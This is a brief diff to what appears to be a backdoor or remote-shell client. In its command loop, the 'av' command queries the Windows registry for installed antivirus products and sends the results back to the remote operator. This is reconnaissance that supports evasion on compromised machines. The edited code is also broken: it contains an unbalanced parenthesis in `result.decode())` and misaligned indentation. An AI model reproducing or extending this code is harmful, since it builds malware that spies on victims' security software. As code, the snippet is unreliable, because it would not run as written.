@@ -361,12 +361,12 @@ def shell():
 
         elif command == 'av':
             try:
-                execute = subprocess.run(['reg', 'query', 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Security Center\\Provider\\Av'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                reliable_send("done")                   
-                result = execute.stdout + execute.stderr
-                result = result.decode()
+               reg_key='HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Security Center\\Provider\\Av'
+               execute = subprocess.run(['reg', 'query', reg_key, '/s'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+               result = execute.stdout + execute.stderr
+               result = result.decode())
                 #print(result)
-                reliable_send(result)
+               reliable_send(result)
             except:
                 pass
 
